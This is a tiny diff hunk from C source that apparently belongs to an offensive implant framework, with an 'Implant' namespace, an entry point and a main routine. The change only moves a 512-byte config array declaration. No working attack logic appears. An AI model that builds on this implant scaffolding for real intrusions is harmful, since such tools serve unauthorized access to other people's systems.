@@ -6,8 +6,8 @@ VOID Entrypoint(HMODULE Base) {
 }
 
 namespace Implant {
+    TXT_SECTION(F) BYTE ConfigBytes[512] = { };
 
-    TXT_SECTION(F) BYTE ConfigBytes[512] = {};
     VOID MainRoutine() {
         HEXANE
 
